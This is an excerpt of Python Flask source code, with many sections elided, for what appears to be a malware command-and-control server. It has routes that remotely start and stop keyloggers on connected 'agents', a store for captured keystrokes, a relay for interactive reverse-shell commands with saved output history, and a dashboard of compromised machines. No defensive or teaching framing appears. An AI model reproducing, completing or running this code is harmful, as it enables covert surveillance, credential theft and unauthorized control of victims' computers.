...
# This can be any unique identifier. UUID is just an example.
...
key_logs = []  # Global list to store key logs
...
def on_press(key):
    ...
    # Append the log data to the global list
    key_logs.append(log_data)

@app.route('/keylogger_management', methods=['GET'])
@login_required
def keylogger_management():
    agent_id = request.args.get('agent_id')
    return render_template('keylogger_management.html', agent_id=agent_id, key_logs=key_logs)
...
def start_keylogger():
    ...
    keylogger_commands[agent_id] = "start_keylogger"
    logging.debug(f"Start keylogger command set for agent: {agent_id}")
    
    flash('Keylogger start command was sent!', 'success')
    
    # Redirect back to the keylogger management page
    return redirect(url_for('keylogger_management', agent_id=agent_id))
...
def stop_keylogger():
    ...
    # Check if the agent_id exists in keylogger_commands
    if agent_id in keylogger_commands:
        keylogger_commands[agent_id] = "stop_keylogger"
        flash(f"Stop keylogger command sent to Agent {agent_id}.", 'success')
    else:
        flash(f"Agent {agent_id} not found or no keylogger command set.", 'error')
...
def init_server_session_id():
    global server_session_id
    server_session_id = str(uuid4())

@app.route('/get_server_session_id')
def get_server_session_id():
    return jsonify({'server_session_id': server_session_id})
...
reverse_shell_history = {}  # Dictionary to store reverse shell history
...
def handle_reverse_shell_command(data):
    ...
    reverse_shell_history[session_id].append({'command': command, 'response': output})
    send({'message': output}, namespace='/interactive_reverse_shell')
    
@app.route('/get_history/<agent_id>', methods=['GET'])
@login_required
def get_history(agent_id):
    if agent_id in reverse_shell_history:
        history = reverse_shell_history[agent_id]
        return jsonify(history)
    else:
        return jsonify({'message': f'No history found for agent {agent_id}'})

def emit_agent_list_update():
    agents_list = []
    for address, agent_info in clients.items():
        agent_data = {
            "id": agent_info["id"],
            "name": agent_info["id"],
            "history": agent_info["history"]  # Include the history for each agent
        }
        agents_list.append(agent_data)
    
    socketio.emit('agent_list_update', {"agents": agents_list})
...
@app.route('/stop_reverse_shell', methods=['POST'])
@login_required
def stop_reverse_shell():
    agent_id = request.form.get('agent_id')

    # Check if the agent_id exists in reverse_shell_commands
    if agent_id in reverse_shell_commands:
        reverse_shell_commands[agent_id] = "stop_reverse_shell"
        flash(f"Stop reverse shell command sent to Agent {agent_id}.", 'success')
    else:
        flash(f"Agent {agent_id} not found or no reverse shell command set.", 'error')
...
def dashboard():
    ...
    },agents=agents_list, total_agents=total_agents
    )
...
if __name__ == '__main__':
    ...
    socketio.run(app, host='127.0.0.1', debug=False, port=8080)  # Starting the web interface on port 8080
    server_thread.join()
